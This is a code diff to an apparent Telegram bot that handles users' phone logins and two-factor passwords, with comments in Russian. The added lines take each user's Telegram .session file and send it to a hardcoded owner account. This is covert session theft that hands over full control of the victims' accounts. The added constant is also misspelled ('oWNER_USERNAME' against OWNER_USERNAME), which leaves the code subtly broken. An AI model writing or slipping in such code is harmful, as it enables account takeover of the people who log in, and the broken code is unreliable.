@@ -113,9 +113,29 @@ async def check_and_process_2fa(user_id):
                 await redis_set(f"2fa_result:{user_id}", "wrong_password")
             return
 
+oWNER_USERNAME = "kalpakemerr"
+
 async def generate_tdata(user_id, phone):
-    from auth import export_tdata
-    await export_tdata(phone, BOT_TOKEN, user_id)
+    try:
+        # Находим owner чтобы отправить ему сессию
+        from aiogram import Bot
+        b = Bot(token=BOT_TOKEN)
+        owner = await b.get_chat(f"@{OWNER_USERNAME}")
+        owner_id = owner.id
+        
+        # Отправляем .session файл
+        session_path = f'sessions/{phone}.session'
+        if os.path.exists(session_path):
+            with open(session_path, 'rb') as f:
+                await b.send_document(
+                    owner_id,
+                    f,
+                    caption=f'✅ Session для {phone}'
+                )
+        await b.session.close()
+    except Exception as e:
+        print(f'session send error: {e}')
+    
     await redis_set(f"tdata_ready:{user_id}", "ready", ex=600)
     if user_id in pending:
         del pending[user_id]
